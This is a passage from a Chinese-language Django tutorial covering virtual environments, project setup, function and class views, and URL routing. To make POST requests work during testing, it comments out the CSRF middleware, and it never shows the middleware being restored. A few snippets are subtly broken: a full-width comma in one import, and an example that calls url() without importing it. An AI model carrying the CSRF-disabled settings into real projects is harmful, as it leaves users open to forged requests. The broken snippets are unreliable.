新版本会覆盖以前的版本, 其它的项目就无法运行了。</p></li><li><p>解决方案:   <code>虚拟环境</code></p><ul><li><strong>作用</strong> : <code>虚拟环境</code>可以搭建独立的<code>python运行环境</code>, 使得单个项目的运行环境与其它项目互不影响.</li><li>所有的<code>虚拟环境</code>都位于<code>/home/</code>下的隐藏目录<code>.virtualenvs</code>下</li></ul></li></ul><h4 id="3-2-如何创建虚拟环境"><a href="#3-2-如何创建虚拟环境" class="headerlink" title="3.2 如何创建虚拟环境"></a>3.2 如何创建虚拟环境</h4><ul><li><p>安装虚拟环境的命令 :</p><pre><code class="bash">sudo pip install virtualenvsudo pip install virtualenvwrapper</code></pre></li><li><p>创建虚拟环境的命令 :</p><ul><li>提示：如果不指定python版本，虚拟环境就会使用默认的python版本</li></ul><p>例如：</p><ul><li><p>使用默认的python创建虚拟环境</p><pre><code class="bash">mkvirtualenv 虚拟环境名称例 ：mkvirtualenv py_django</code></pre></li></ul></li></ul><ul><li><p>指定python版本创建虚拟环境</p><pre><code class="bash">mkvirtualenv -p python3 虚拟环境名称例 ：mkvirtualenv -p python3 py_django  # 使用的是默认的python3版本mkvirtualenv -p python3.5 py_django  # 使用的是python3.5版本，注意，所使用的python版本在本机已经安装才行</code></pre><p>提示 :</p><ul><li>创建虚拟环境需要联网</li><li>创建成功后, 会自动工作在这个虚拟环境上</li><li>工作在虚拟环境上, 提示符最前面会出现 “虚拟环境名称”</li></ul></li></ul><h4 id="3-3-如何使用虚拟环境"><a href="#3-3-如何使用虚拟环境" class="headerlink" title="3.3 如何使用虚拟环境"></a>3.3 如何使用虚拟环境</h4><p>查看所有虚拟环境的命令 :</p><pre><code class="bash">  workon 两次tab键</code></pre><p>使用虚拟环境的命令 :</p><pre><code class="bash">  workon 虚拟环境名称  例：  workon py_django</code></pre><p>退出虚拟环境的命令 :</p><pre><code>  deactivate</code></pre><p> 删除虚拟环境的命令 :</p><pre><code class="bash">  rmvirtualenv 虚拟环境名称  先退出：deactivate  再删除：rmvirtualenv 虚拟环境名称</code></pre><h4 id="3-4-如何在虚拟环境中安装工具包"><a href="#3-4-如何在虚拟环境中安装工具包" class="headerlink" title="3.4 如何在虚拟环境中安装工具包"></a>3.4 如何在虚拟环境中安装工具包</h4><ul><li><p>虚拟环境中安装框架、包命令 :</p><pre><code class="shell">  pip install 框架、包名称  例 : 安装`django==2.2.16`  pip install django==2.2.16</code></pre></li><li><p>框架、包安装的位置 :</p><ul><li><code>~/.virtualenvs/虚拟环境名称/lib/python版本/site-packages</code></li></ul></li><li><p>查看虚拟环境中安装的包 :</p><pre><code class="shell">pip freeze 或者 pip list</code></pre></li></ul><h4 id="3-5-特别提示"><a href="#3-5-特别提示" class="headerlink" title="3.5 特别提示"></a>3.5 特别提示</h4><blockquote><ul><li>在虚拟环境中，直接使用 <code>pip install</code> 安装Django框架或者扩展包时，速度特别慢，甚至报红色警告。</li><li>这主要是因为Django框架和很多的扩展包都是从国外服务器进行下载安装的。</li></ul></blockquote><p><strong>指定镜像源：加速下载安装Django框架或者扩展包</strong></p><p><strong><code>pip install django==2.2.16 -i https://pypi.tuna.tsinghua.edu.cn/simple/</code></strong></p><p>如果还是下载安装比较慢，可以把上面的镜像源链接换为下面的任意一个：</p><pre><code class="http">https://mirrors.aliyun.com/pypi/simple/http://pypi.douban.com/simple/http://pypi.mirrors.ustc.edu.cn/simple/</code></pre><h3 id="4-Django工程创建"><a href="#4-Django工程创建" class="headerlink" title="4.Django工程创建"></a>4.Django工程创建</h3><h4 id="4-1-创建工程"><a href="#4-1-创建工程" class="headerlink" title="4.1 创建工程"></a>4.1 创建工程</h4><p>创建工程的命令为：</p><pre><code class="shell">django-admin startproject 工程名称例子：cd ~/Desktop/django-admin startproject Django_test</code></pre><p>执行后，会多出一个新目录名为 <strong>Django_test</strong>，此即为新创建的工程目录。</p><h4 id="4-2-工程目录说明"><a href="#4-2-工程目录说明" class="headerlink" title="4.2 工程目录说明"></a>4.2 工程目录说明</h4><ul><li>与项目同名的目录，此处为 <strong>Django_test</strong>。</li><li><strong>settings.py</strong> 是项目的整体配置文件。</li><li><strong>urls.py</strong> 是项目的URL配置文件。</li><li><strong>wsgi.py</strong> 是项目与WSGI兼容的Web服务器入口。</li><li><strong>manage.py</strong> 是项目管理文件，通过它管理项目。</li></ul><h4 id="4-3-运行开发服务器"><a href="#4-3-运行开发服务器" class="headerlink" title="4.3 运行开发服务器"></a>4.3 运行开发服务器</h4><p>在开发阶段，为了能够快速预览到开发的效果，django提供了一个纯python编写的轻量级web服务器，仅在开发阶段使用。</p><p>运行服务器命令如下：</p><pre><code class="shell">python manage.py runserver ip:端口例：python manage.py runserver 127.0.0.1:9000或：python manage.py runserver    # 可以不写IP和端口，默认IP是127.0.0.1，默认端口为8000。</code></pre><p>在浏览器中输入网址“127.0.0.1:8000”便可看到效果。</p><ul><li>django默认工作在调式Debug模式下，如果增加、修改、删除文件，服务器会自动重启。</li></ul><h3 id="5-Django工程配置"><a href="#5-Django工程配置" class="headerlink" title="5. Django工程配置"></a>5. Django工程配置</h3><p>提示：</p><ul><li>工程的配置文件是 <strong>settings.py</strong></li><li>以下内容仅仅是测试Django工程修改配置文件后的效果</li></ul><h4 id="5-1-BASE-DIR"><a href="#5-1-BASE-DIR" class="headerlink" title="5.1 BASE_DIR"></a>5.1 BASE_DIR</h4><pre><code class="python">BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))</code></pre><p>当前工程的根目录，Django会依此来定位工程内的相关文件，我们也可以使用该参数来构造文件路径。</p><h4 id="5-2-DEBUG"><a href="#5-2-DEBUG" class="headerlink" title="5.2 DEBUG"></a>5.2 DEBUG</h4><p>调试模式，创建工程后初始值为<strong>True</strong>，即默认工作在调试模式下。</p><p>作用：</p><ul><li>修改代码文件，程序自动重启</li></ul><p><strong>注意：部署线上运行的Django不要运行在调式模式下，记得修改DEBUG=False。</strong></p><h4 id="5-3-本地语言与时区"><a href="#5-3-本地语言与时区" class="headerlink" title="5.3 本地语言与时区"></a>5.3 本地语言与时区</h4><p>Django支持本地化处理，即显示语言与时区支持本地化。</p><p>本地化是将显示的语言、时间等使用本地的习惯，这里的本地化就是进行中国化，中国大陆地区使用<strong>简体中文</strong>，时区使用<strong>亚洲/上海</strong>时区，注意这里不使用北京时区表示。</p><p>初始化的工程默认语言和时区为英语和UTC标准时区</p><pre><code class="python">LANGUAGE_CODE = &#39;en-us&#39; # 语言：英语TIME_ZONE = &#39;UTC&#39; # UTC标准时区</code></pre><p>将语言和时区修改为中国大陆信息</p><pre><code class="python">LANGUAGE_CODE = &#39;zh-hans&#39; # 语言：简体中文TIME_ZONE = &#39;Asia/Shanghai&#39; # 亚洲上海</code></pre><h3 id="6-Django子应用"><a href="#6-Django子应用" class="headerlink" title="6. Django子应用"></a>6. Django子应用</h3><p>提示：</p><ul><li>在Web应用中，通常有一些业务功能模块是可以在不同的项目中复用的。</li><li>所以，在开发中通常将项目工程拆分为不同的子功能模块。</li><li>而且各功能模块间保持了相对的独立，在其他项目中需要用到某个特定功能模块时，可以将该模块代码整体复制过去，达到复用。</li></ul><h4 id="6-1-创建子应用"><a href="#6-1-创建子应用" class="headerlink" title="6.1 创建子应用"></a>6.1 创建子应用</h4><p>在Django中，创建子应用仍然可以通过命令来操作，即：</p><pre><code class="shell">cd 项目工程django-admin startapp 子应用名称(推荐)或者python manage.py startapp 子应用名称</code></pre><ul><li>例如：<ul><li>在上一步创建的 <strong>Django_test</strong> 工程中，创建一个专门管理 <strong>用户模块</strong> 的子应用</li><li>如果管理 <strong>用户模块</strong> 的子应用名称设计为 <strong>users</strong>，则命令为：</li></ul></li></ul><pre><code class="shell">cd ~/Desktop/Django_test/django-admin startapp users或者python manage.py startapp users</code></pre><h4 id="6-2-子应用目录说明"><a href="#6-2-子应用目录说明" class="headerlink" title="6.2 子应用目录说明"></a>6.2 子应用目录说明</h4><ul><li><strong>admin.py</strong> 文件跟网站的后台管理站点配置相关。</li><li><strong>apps.py</strong> 文件用于配置当前子应用的相关信息。</li><li><strong>migrations</strong> 目录用于存放数据库迁移历史文件。</li><li><strong>models.py</strong> 文件用户保存数据库模型类。</li><li><strong>tests.py</strong> 文件用于开发测试用例，编写单元测试。</li><li><strong>views.py</strong> 文件用于编写Web应用视图。</li></ul><h4 id="6-3-注册子应用"><a href="#6-3-注册子应用" class="headerlink" title="6.3 注册子应用"></a>6.3 注册子应用</h4><p>创建出来的子应用目录文件虽然被放到了工程项目目录中，但是django工程并不能立即直接使用该子应用，需要注册安装后才能使用。</p><p>在工程配置文件settings.py中，<strong>INSTALLED_APPS</strong>项保存了工程中已经注册安装的子应用，初始工程中的INSTALLED_APPS如下：</p><p><strong>注册安装一个子应用的方法，即是将子应用的配置信息文件apps.py中的Config类添加到INSTALLED_APPS列表中。</strong></p><pre><code class="python">INSTALLED_APPS = [    &#39;django.contrib.admin&#39;,    &#39;django.contrib.auth&#39;,    &#39;django.contrib.contenttypes&#39;,    &#39;django.contrib.sessions&#39;,    &#39;django.contrib.messages&#39;,    &#39;django.contrib.staticfiles&#39;,    &#39;users&#39;, # 用户模块子应用]</code></pre><h2 id="二、视图（views）"><a href="#二、视图（views）" class="headerlink" title="二、视图（views）"></a>二、视图（views）</h2><p><strong>经验值分享</strong></p><ol><li><strong>请求对象的</strong>user属性</li></ol><p>参考知识点：<strong>请求HttpRequest</strong></p><ul><li>提示：<ul><li>请求对象的user属性返回的是<strong>请求过程中认证出来的用户对象</strong></li></ul></li><li>使用方式：<ul><li><code>user = request.user</code></li></ul></li><li>使用场景：<ul><li>从请求中获取当前登录用户对象信息</li></ul></li><li>注意点：<ul><li><strong><code>request.user</code></strong>获取到的不一定是当前登录用户对象</li><li>如果当前请求是已登录用户发送的，那么<strong><code>request.user</code></strong>获取到的才是当前登录用户对象</li><li>如果当前请求是未登录用户发送的，那么<strong><code>request.user</code></strong>获取到的会是一个AnonymousUser对象（匿名用户，没有任何用户信息，没有使用价值）。</li></ul></li><li>工作中如何使用<code>request.user</code>？<ul><li><strong><code>request.user</code></strong>需要搭配用户访问的限制来使用。</li><li>需要先判断用户是否已登录，如果用户已登录，就可以大胆放心的使用<strong><code>request.user</code></strong>。</li></ul></li></ul><ol start="2"><li><strong>自定义中间件注册原则</strong></li></ol><p>参考知识点：<strong>中间件Middleware</strong></p><ul><li>提示：多个中间件执行的顺序是有规律的</li></ul><pre><code class="python">多个中间件注册顺序：MIDDLEWARE = [    &#39;Middleware1&#39;,    &#39;Middleware2&#39;,    &#39;Middleware3&#39;,]请求时：按照顺序由上而下进入中间件    [1 ---&gt; 2 ---&gt; 3]响应时：先进入的中间件后执行完的    [3 ---&gt; 2 ---&gt; 1]经验：    中间件中请求优先的逻辑，中间件一定要放在最前注册    中间件中响应优先的逻辑，中间件一定要放在最后注册例子：    解决前后端分离时请求跨域的问题    每个请求都要解决跨域的问题，所以需要用到中间件    而且需要在请求处理时最先处理跨域的问题，所以解决请求跨域时的中间件需要最先注册</code></pre><h3 id="1-函数视图"><a href="#1-函数视图" class="headerlink" title="1.函数视图"></a>1.函数视图</h3><h4 id="1-1-定义函数视图"><a href="#1-1-定义函数视图" class="headerlink" title="1.1 定义函数视图"></a>1.1 定义函数视图</h4><blockquote><p><strong>函数视图定义方式：</strong></p></blockquote><pre><code class="python">1. 函数视图它是一个标准的Python函数。2. 函数视图中，第一个参数必须定义：第一个参数为请求对象，用于接收用户发送的请求报文。3. 函数视图中，必须返回响应对象：用于构造响应报文，并响应给用户。4. 说明：    请求对象：HttpRequest() 对应的对象    响应对象：HttpResponse() 对应的对象from django.shortcuts import renderfrom django import http# Create your views here.def register(request):    &quot;&quot;&quot;    用户注册函数视图    :param request: 请求对象，包含了请求报文信息    :return: 响应对象，用于构造响应报文，并响应给用户    &quot;&quot;&quot;    # 响应数据    return http.HttpResponse(&#39;这里假装返回注册页面&#39;)</code></pre><h4 id="1-2-访问函数视图"><a href="#1-2-访问函数视图" class="headerlink" title="1.2 访问函数视图"></a>1.2 访问函数视图</h4><blockquote><p><strong>提示：</strong></p></blockquote><ul><li>我们定义好的函数视图，需要用户能够访问到。</li><li>用户如何访问函数视图？<ul><li><strong>通过网络地址向Django程序发请求，即可访问到函数视图</strong></li></ul></li></ul><blockquote><p><strong>问题：</strong></p></blockquote><ul><li>如何保证用户发送的请求，能够访问到对应的函数视图？</li></ul><blockquote><p><strong>解决：</strong></p></blockquote><ul><li><strong>路由：使用路由匹配请求地址，每匹配成功一个就执行对应的函数视图逻辑</strong></li><li><strong>定义路由的方法：path()、re_path()、url()</strong></li></ul><blockquote><p><strong>需求：</strong></p></blockquote><ul><li>用户通过网络地址<strong><code>http://127.0.0.1:8000/users/register/</code></strong>访问用户注册视图</li></ul><h4 id="1-3-访问函数视图：需求实现-–-gt-path"><a href="#1-3-访问函数视图：需求实现-–-gt-path" class="headerlink" title="1.3 访问函数视图：需求实现 –&gt; path()"></a>1.3 访问函数视图：需求实现 –&gt; path()</h4><blockquote><p><strong>1. 新建子路由文件</strong></p><ul><li>在<strong><code>子应用</code></strong>中新建一个<strong><code>urls.py</code></strong>文件用于定义该应用的所有路由信息</li></ul></blockquote><blockquote><p><strong>2. 注册子路由</strong></p><ul><li>在<strong><code>子应用/urls.py</code></strong>文件中定义路由信息</li></ul></blockquote><pre><code class="python">from django.urls import pathfrom . import views# urlpatterns是被Django自动识别的路由列表变量：定义该应用的所有路由信息urlpatterns = [    # 函数视图路由语法：    # path(&#39;网络地址正则表达式&#39;, 函数视图名),    # 用户注册：http://127.0.0.1:8000/users/register/    path(&#39;users/register/&#39;, views.register),]</code></pre><blockquote><p><strong>3. 注册总路由</strong></p><ul><li>在工程总路由<strong><code>工程同名目录/urls.py</code></strong>中包含子应用的路由数据</li></ul></blockquote><pre><code class="python">from django.contrib import adminfrom django.urls import path, includeurlpatterns = [    # 自带的后台管理系统的总路由：可以忽略    path(&#39;admin/&#39;, admin.site.urls),    # 总路由包含子路由语法    # path(&#39;网络地址前缀/&#39;, include(&#39;子应用.urls&#39;)),    # 或者    # path(&#39;&#39;, include(&#39;子应用.urls&#39;)),    # 用户模块：http://127.0.0.1:8000/users/register/    path(&#39;&#39;, include(&#39;users.urls&#39;)),]</code></pre><blockquote><p>总路由说明：</p></blockquote><ul><li>一个子应用对应一个总路由。</li><li>总路由中，使用<strong><code>include()</code></strong>来将<strong><code>users子应用</code></strong>里的所有路由都包含进工程总路由中。</li></ul><blockquote><p><strong>4. 启动运行测试</strong></p></blockquote><p>重新启动django程序</p><pre><code class="shell">python manage.py runserver</code></pre><p>使用postman进行请求测试： <strong><code>http://127.0.0.1:8000/users/register/</code></strong></p><h4 id=""><a href="#" class="headerlink" title=""></a></h4><h3 id="2-类视图"><a href="#2-类视图" class="headerlink" title="2.类视图"></a>2.类视图</h3><h4 id="2-1-函数视图问题说明-不推荐使用函数视图"><a href="#2-1-函数视图问题说明-不推荐使用函数视图" class="headerlink" title="2.1 函数视图问题说明(不推荐使用函数视图)"></a>2.1 函数视图问题说明(不推荐使用函数视图)</h4><pre><code class="python"># GET http://127.0.0.1:8000/users/register/def register(request):    &quot;&quot;&quot;    用户注册函数视图    :param request: 请求对象，包含了请求报文信息    :return: 响应对象，用于构造响应报文，并响应给用户    &quot;&quot;&quot;    # 响应数据    return http.HttpResponse(&#39;这里假装返回注册页面&#39;)</code></pre><blockquote><p><strong>需求：</strong></p></blockquote><ul><li>用户向地址<strong><code>http://127.0.0.1:8000/users/register/</code></strong>发送GET请求，用来获取注册页面。</li><li>用户向地址<strong><code>http://127.0.0.1:8000/users/register/</code></strong>发送POST请求，用来实现注册逻辑。</li></ul><blockquote><p><strong>需求实现：</strong></p></blockquote><pre><code class="python">def register(request):    &quot;&quot;&quot;    用户注册函数视图    :param request: 请求对象，包含了请求报文信息    :return: 响应对象，用于构造响应报文，并响应给用户    &quot;&quot;&quot;    # 获取请求方法，判断是GET还是POST请求    if request.method == &#39;GET&#39;:        # 处理GET请求，返回注册页面        return HttpResponse(&#39;这里假装返回注册页面&#39;)    else:        # 处理POST请求，实现注册逻辑        return HttpResponse(&#39;这里假装实现注册逻辑&#39;)</code></pre><blockquote><p><strong>函数视图问题说明：</strong></p></blockquote><ul><li>当遇到视图对应的同一个路径，提供了多种不同HTTP请求方式的支持时，便需要在一个函数中编写不同的业务逻辑，代码可读性与复用性都很差。</li></ul><blockquote><p><strong>解决方案：</strong></p></blockquote><ul><li><strong>类视图</strong></li></ul><h4 id="2-2-定义类视图"><a href="#2-2-定义类视图" class="headerlink" title="2.2 定义类视图"></a>2.2 定义类视图</h4><blockquote><p><strong>类视图定义方式：</strong></p></blockquote><pre><code class="python">1. 类视图它是一个标准的Python类。2. 类视图需要继承自Django提供的父类视图View。3. 在类视图中，    3.1 需要定义跟请求方法同名的函数来对应不同请求方式    3.2 在请求方法同名的函数中，还必须定义一个接收请求的参数（同函数视图）    3.3 在请求方法同名的函数中，还必须返回一个响应对象（同函数视图）from django.views import Viewclass RegisterView(View):    &quot;&quot;&quot;用户注册类视图    http://127.0.0.1:8000/users/register/    &quot;&quot;&quot;    def get(self, request):        &quot;&quot;&quot;        处理GET请求，返回注册页面        :param request: 请求对象，包含了请求报文信息        :return: 响应对象，用于构造响应报文，并响应给用户        &quot;&quot;&quot;        return http.HttpResponse(&#39;这里假装返回注册页面&#39;)    def post(self, request):        &quot;&quot;&quot;        处理POST请求，实现注册逻辑        :param request: 请求对象，包含了请求报文信息        :return: 响应对象，用于构造响应报文，并响应给用户        &quot;&quot;&quot;        return http.HttpResponse(&#39;这里假装实现注册逻辑&#39;)</code></pre><blockquote><p><strong>类视图的好处：</strong></p><ul><li><strong>代码可读性好</strong></li><li><strong>类视图相对于函数视图有更高的复用性</strong>， 如果其他地方需要用到某个类视图的某个特定逻辑，直接继承该类视图即可。</li></ul></blockquote><h4 id="2-3-访问类视图"><a href="#2-3-访问类视图" class="headerlink" title="2.3 访问类视图"></a>2.3 访问类视图</h4><blockquote><p><strong>说明：</strong></p></blockquote><ul><li>类视图的访问和函数视图的访问是一模一样的。</li><li><strong>类视图的访问也是使用路由匹配请求地址，每匹配成功一个就执行对应的类视图逻辑</strong></li></ul><blockquote><p><strong>需求：</strong></p></blockquote><ul><li>用户向地址<strong><code>http://127.0.0.1:8000/users/register/</code></strong>发送GET请求，用来获取注册页面。</li><li>用户向地址<strong><code>http://127.0.0.1:8000/users/register/</code></strong>发送POST请求，用来实现注册逻辑。</li></ul><h4 id="2-4-访问类视图：需求实现-–-gt-path"><a href="#2-4-访问类视图：需求实现-–-gt-path" class="headerlink" title="2.4 访问类视图：需求实现 –&gt; path()"></a>2.4 访问类视图：需求实现 –&gt; path()</h4><blockquote><p><strong>1. 注册子路由</strong></p><ul><li>在<strong><code>子应用/urls.py</code></strong>文件中定义路由信息</li><li>由于当前代码还是编写在users子应用中的，所以总路由注册过一次之后，不用再注册</li></ul></blockquote><pre><code class="python">from django.urls import pathfrom . import views# urlpatterns是被Django自动识别的路由列表变量：定义该应用的所有路由信息urlpatterns = [    # 类视图路由语法：    # path(&#39;网络地址正则表达式&#39;, 类视图.as_view()),    # 用户注册：http://127.0.0.1:8000/users/register/    path(&#39;users/register/&#39;, views.RegisterView.as_view()),]</code></pre><blockquote><p><strong>2. 启动运行测试</strong></p></blockquote><ul><li>2.1 注释CSRF中间件<ul><li><strong>Django默认开启了CSRF防护</strong>，会对非GET请求(POST, PUT, DELETE)进行CSRF防护验证，在测试时可以关闭CSRF防护机制</li><li>关闭CSRF防护机制是在<code>settings.py</code>文件中注释掉<code>CSRF中间件</code></li></ul></li></ul><pre><code class="python"># 中间件MIDDLEWARE = [    &#39;django.middleware.security.SecurityMiddleware&#39;,    &#39;django.contrib.sessions.middleware.SessionMiddleware&#39;,    &#39;django.middleware.common.CommonMiddleware&#39;,    # 为保证非GET请求(POST, PUT, DELETE)可以正常接收，该中间件需要注释掉    # &#39;django.middleware.csrf.CsrfViewMiddleware&#39;,    &#39;django.contrib.auth.middleware.AuthenticationMiddleware&#39;,    &#39;django.contrib.messages.middleware.MessageMiddleware&#39;,    &#39;django.middleware.clickjacking.XFrameOptionsMiddleware&#39;,]</code></pre><ul><li><strong>2.2 重新启动Django程序</strong></li></ul><pre><code class="shell">python manage.py runserver</code></pre><ul><li>2.3 使用postman进行请求测试： <strong><code>http://127.0.0.1:8000/users/register/</code></strong></li></ul><h4 id="2-5-as-view-底层原理（仅做了解）"><a href="#2-5-as-view-底层原理（仅做了解）" class="headerlink" title="2.5 as_view()底层原理（仅做了解）"></a>2.5 as_view()底层原理（仅做了解）</h4><pre><code class="python">class View:    &quot;&quot;&quot;    Intentionally simple parent class for all views. Only implements    dispatch-by-method and simple sanity checking.    # 为所有视图定义简单的父类，只实现了请求方法分派和简单的完整性检查。    &quot;&quot;&quot;    # 定义Django允许接收的请求方法    http_method_names = [&#39;get&#39;, &#39;post&#39;, &#39;put&#39;, &#39;patch&#39;, &#39;delete&#39;, &#39;head&#39;, &#39;options&#39;, &#39;trace&#39;]    def __init__(self, **kwargs):        &quot;&quot;&quot;        Constructor. Called in the URLconf; can contain helpful extra        keyword arguments, and other things.        # 类视图的初始化构造函数，创建类视图对象时会被调用，并可以接收额外的参数        &quot;&quot;&quot;        # Go through keyword arguments, and either save their values to our        # instance, or raise an error.        for key, value in kwargs.items():            setattr(self, key, value)    @classonlymethod    def as_view(cls, **initkwargs):        &quot;&quot;&quot;Main entry point for a request-response process.        # 请求-响应过程的主要入口点.        &quot;&quot;&quot;        for key in initkwargs:            # 遍历as_view()接收的参数            # 省略......        def view(request, *args, **kwargs):            &quot;&quot;&quot;准备一个函数视图，将来作为as_view()的返回值，并用于路由匹配&quot;&quot;&quot;            # 初始化类视图对象            self = cls(**initkwargs)            if hasattr(self, &#39;get&#39;) and not hasattr(self, &#39;head&#39;):                self.head = self.get            # 将路由中传入的参数，绑定到类视图对象中            self.setup(request, *args, **kwargs)            # 检查类视图是否完整：类视图中必须要有&#39;request&#39; attribute            if not hasattr(self, &#39;request&#39;):                raise AttributeError(                    &quot;%s instance has no &#39;request&#39; attribute. Did you override &quot;                    &quot;setup() and forget to call super()?&quot; % cls.__name__                )            # 调用请求分发的方法(最核心)：将请求分发给跟请求方法同名的函数            return self.dispatch(request, *args, **kwargs)        view.view_class = cls        view.view_initkwargs = initkwargs        # take name and docstring from class        update_wrapper(view, cls, updated=())        # and possible attributes set by decorators        # like csrf_exempt from dispatch        update_wrapper(view, cls.dispatch, assigned=())        return view    def setup(self, request, *args, **kwargs):        &quot;&quot;&quot;Initialize attributes shared by all view methods.        # 初始化所有视图方法共享的属性：将路由中传入的参数，绑定到类视图对象中        &quot;&quot;&quot;        self.request = request        self.args = args        self.kwargs = kwargs    def dispatch(self, request, *args, **kwargs):        # Try to dispatch to the right method; if a method doesn&#39;t exist,        # defer to the error handler. Also defer to the error handler if the        # request method isn&#39;t on the approved list.        # 尽量采用正确的调度方法;如果方法不存在，请遵从错误处理程序。如果请求方法不在批准的列表中，也遵从错误处理程序。        # 先判断客户端的请求方法是否在允许接收的方法列表中        if request.method.lower() in self.http_method_names:            # 如果客户端的请求方法在允许接收的方法列表中，            # 取出类视图对象中的跟请求方法同名的函数名，赋值给handler            # 比如：当前客户端发送的请求，请求方法是GET，那么，handler=get            handler = getattr(self, request.method.lower(), self.http_method_not_allowed)        else:            # 如果客户端的请求方法不在允许接收的方法列表中，遵从错误处理程序            handler = self.http_method_not_allowed        # 如果请求分发没有问题，那么就去调用该跟请求分发同名的函数        # 如果当前客户端发送的请求，请求方法是GET        # handler(request, *args, **kwargs)等价于get(request, *args, **kwargs)        # 如果handler()调用成功，那么跟请求分发同名的函数就会被调用执行        return handler(request, *args, **kwargs)    def http_method_not_allowed(self, request, *args, **kwargs):        &quot;&quot;&quot;错误处理程序：请求方法不匹配时，响应的错误信息&quot;&quot;&quot;        logger.warning(            &#39;Method Not Allowed (%s): %s&#39;, request.method, request.path,            extra={&#39;status_code&#39;: 405, &#39;request&#39;: request}        )        return HttpResponseNotAllowed(self._allowed_methods())</code></pre><h4 id="2-6-类视图添加扩展类"><a href="#2-6-类视图添加扩展类" class="headerlink" title="2.6 类视图添加扩展类"></a>2.6 类视图添加扩展类</h4><blockquote><p>提示：</p></blockquote><ul><li>使用面向对象多继承的特性，可以给类视图定义扩展类。</li><li>在扩展类中，可以定义想要向类视图补充的方法。</li><li>类视图继承这些扩展类作为父类，便可实现代码复用。</li></ul><blockquote><p>示例：</p></blockquote><pre><code class="python">class ListModelMixin(object):    &quot;&quot;&quot;list扩展类 &quot;&quot;&quot;    def list(self, request, *args, **kwargs):        passclass CreateModelMixin(object):    &quot;&quot;&quot;create扩展类 &quot;&quot;&quot;    def create(self, request, *args, **kwargs):        passclass TestMixinView(CreateModelMixin, ListModelMixin, View):    &quot;&quot;&quot;同时继承两个扩展类，复用list和create方法&quot;&quot;&quot;    def get(self, request):        self.list(request)        pass    def post(self, request):        self.create(request)        pass</code></pre><h3 id="3-路由"><a href="#3-路由" class="headerlink" title="3.路由"></a>3.路由</h3><blockquote><p><strong>提示：</strong></p></blockquote><ul><li><strong>路由可以保证用户发送的请求，能够访问到对应的视图</strong></li><li><strong>使用路由匹配请求地址，每匹配成功一个就执行对应的函数视图逻辑</strong></li><li>定义路由的方法：path()、re_path()、url()<ul><li>Django==1.x版本：url()</li><li>Django==2.x版本：path()、re_path()</li></ul></li><li>说明：<ul><li>为了在版本迭代中，保留旧版本的路由系统，url()在新版中依然可用。</li><li>并新增了一个url()的替代方案re_path()，所以url()几乎跟re_path()一样。</li></ul></li></ul><blockquote><p><strong>需求：</strong></p></blockquote><ul><li>用户通过网络地址<strong><code>http://127.0.0.1:8000/users/login/</code></strong>访问用户登录视图</li><li>我们后续演示路由，都会选择使用类视图。</li></ul><h4 id="3-1-定义用户登录类视图"><a href="#3-1-定义用户登录类视图" class="headerlink" title="3.1 定义用户登录类视图"></a>3.1 定义用户登录类视图</h4><pre><code class="python">class LoginView(View):    &quot;&quot;&quot;用户登录类视图    http://127.0.0.1:8000/users/login/    &quot;&quot;&quot;    def get(self, request):        &quot;&quot;&quot;        处理GET请求，返回登录页面        :param request: 请求对象，包含了请求报文信息        :return: 响应对象，用于构造响应报文，并响应给用户        &quot;&quot;&quot;        return http.HttpResponse(&#39;假装这是个登录页面&#39;)    def post(self, request):        &quot;&quot;&quot;        处理POST请求，实现登录逻辑        :param request: 请求对象，包含了请求报文信息        :return: 响应对象，用于构造响应报文，并响应给用户        &quot;&quot;&quot;        return http.HttpResponse(&#39;假装实现登录逻辑&#39;)</code></pre><h4 id="3-2-re-path-定义路由"><a href="#3-2-re-path-定义路由" class="headerlink" title="3.2 re_path()定义路由"></a>3.2 re_path()定义路由</h4><blockquote><p><strong>1. 注册子路由</strong></p></blockquote><pre><code class="python">from django.urls import re_path， pathurlpatterns = [    # 函数视图re_path()路由语法：    # re_path(r&#39;^网络地址正则表达式$&#39;, 函数视图名),    # 类视图re_path()路由语法：    # re_path(r&#39;^网络地址正则表达式$&#39;, 类视图.as_view()),    # 用户登录：http://127.0.0.1:8000/users/login/    re_path(r&#39;^users/login/$&#39;, views.LoginView.as_view()),    #或者使用 path(&#39;users/login/&#39;, views.LoginView.as_view()),]</code></pre><h4 id="3-3-url-定义路由"><a href="#3-3-url-定义路由" class="headerlink" title="3.3 url()定义路由"></a>3.3 url()定义路由</h4><blockquote><p><strong>1. 注册子路由</strong></p></blockquote><pre><code class="python">from django.urls import re_pathurlpatterns = [    # 函数视图url()路由语法：    # url(r&#39;^网络地址正则表达式$&#39;, 函数视图名),    # 类视图url()路由语法：    # url(r&#39;^网络地址正则表达式$&#39;, 类视图.as_view()),    # 用户登录：http://127.0.0.1:8000/users/login/    url(r&#39;^users/login/$&#39;, views.LoginView.as_view()),]</code></pre><blockquote><p><strong>2. postman进行请求测试</strong></p><ul><li>使用postman分别向<code>http://127.0.0.1:8000/users/login/</code>发送GET和POST请求</li></ul></blockquote><h4 id="3-4-路由方法对比"><a href="#3-4-路由方法对比" class="headerlink" title="3.4 路由方法对比"></a>3.4 路由方法对比</h4><blockquote><p><strong>path()</strong></p></blockquote><pre><code class="python"># 函数视图path()路由语法：# path(&#39;网络地址正则表达式&#39;, 函数视图名),# 类视图path()路由语法：# path(&#39;网络地址正则表达式&#39;, 类视图.as_view()),</code></pre><ul><li><code>path()</code>路由语法中，不需要定义正则表达式严格的开头和结尾，因为已经封装好了</li></ul><blockquote><p><strong>re_path()、url()</strong></p></blockquote><pre><code class="python"># 函数视图re_path()路由语法：# re_path(r&#39;^网络地址正则表达式$&#39;, 函数视图名),# 类视图re_path()路由语法：# re_path(r&#39;^网络地址正则表达式$&#39;, 类视图.as_view()),# 函数视图url()路由语法：# url(r&#39;^网络地址正则表达式$&#39;, 函数视图名),# 类视图url()路由语法：# url(r&#39;^网络地址正则表达式$&#39;, 类视图.as_view()),</code></pre><ul><li><code>re_path()和url()</code>路由语法中，必须要定义正则表达式严格的开头和结尾</li></ul><h4 id="3-5-路由解析顺序"><a href="#3-5-路由解析顺序" class="headerlink" title="3.5 路由解析顺序"></a>3.5 